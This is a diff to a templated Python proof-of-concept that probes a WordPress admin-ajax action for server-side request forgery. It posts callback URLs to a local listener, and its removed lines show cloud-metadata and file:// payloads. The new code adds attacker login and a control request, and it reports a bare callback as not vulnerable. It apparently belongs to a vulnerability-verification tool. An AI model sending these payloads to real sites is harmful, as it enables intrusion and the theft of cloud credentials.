@@ -3,10 +3,21 @@ import socket
 import threading
 import time
 import requests
+from wp_login import wp_login
+from poc_result import emit_result
 
 TARGET = "{{ target_url }}"
 ACTION = "{{ ajax_action }}"
 PARAM  = "{{ injectable_param }}"
+ATTACKER_ROLE = "{{ attacker_role }}"
+USERNAME = "{{ test_username }}"
+PASSWORD = "{{ test_password }}"
+
+session = requests.Session()
+if ATTACKER_ROLE.lower() not in {"unauthenticated", "anonymous", "guest"}:
+    login = wp_login(session, TARGET, USERNAME, PASSWORD)
+    if not login.success:
+        raise RuntimeError(f"attacker login failed: {login.reason}")
 
 # Spin a tiny HTTP listener on the host loopback. If the target fetches it,
 # the SSRF is confirmed end-to-end.
@@ -30,25 +41,40 @@ server = http.server.HTTPServer(("0.0.0.0", LISTEN_PORT), _H)
 threading.Thread(target=server.serve_forever, daemon=True).start()
 
 # host.docker.internal is reachable from a Docker container on Mac/Win.
-CALLBACK_URLS = [
+ATTACK_URLS = [
     f"http://host.docker.internal:{LISTEN_PORT}/squadrone_ssrf",
     f"http://172.17.0.1:{LISTEN_PORT}/squadrone_ssrf",
-    f"http://169.254.169.254/latest/meta-data/",  # cloud metadata, harmless if no provider
-    f"file:///etc/hostname",
 ]
 
-print(f"[*] Listener up on :{LISTEN_PORT}; testing SSRF action={ACTION} param={PARAM}")
-for url in CALLBACK_URLS:
-    requests.post(
+for url in ATTACK_URLS:
+    session.post(
         f"{TARGET}/wp-admin/admin-ajax.php",
         data={"action": ACTION, PARAM: url},
         timeout=30,
     )
 
 time.sleep(2)
+attack_hits = list(HITS)
+HITS.clear()
+session.post(
+    f"{TARGET}/wp-admin/admin-ajax.php",
+    data={"action": ACTION, PARAM: "not-a-url-control"},
+    timeout=30,
+)
+time.sleep(1)
+control_hits = list(HITS)
 server.shutdown()
 
-if HITS:
-    print(f"[+] SUCCESS: target fetched our listener — hits={HITS}")
-else:
-    print("[!] FAILURE: no callback hits — SSRF not confirmed via our listener")
+# A callback proves the request primitive, not meaningful CIA impact. Keep this
+# non-vulnerable until the PoC is refined to demonstrate access to a protected
+# internal service or secret that the attacker cannot obtain directly.
+callback_primitive = bool(attack_hits) and not control_hits
+emit_result(
+    verdict="not_vulnerable",
+    oracle="callback",
+    attacker_role=ATTACKER_ROLE,
+    request={"method": "POST", "url": f"{TARGET}/wp-admin/admin-ajax.php"},
+    attack={"observed": callback_primitive, "hit_count": len(attack_hits), "hits": attack_hits},
+    control={"observed": bool(control_hits), "hit_count": len(control_hits), "hits": control_hits},
+    impact="A server-side callback alone does not demonstrate confidentiality, integrity, or availability impact.",
+)
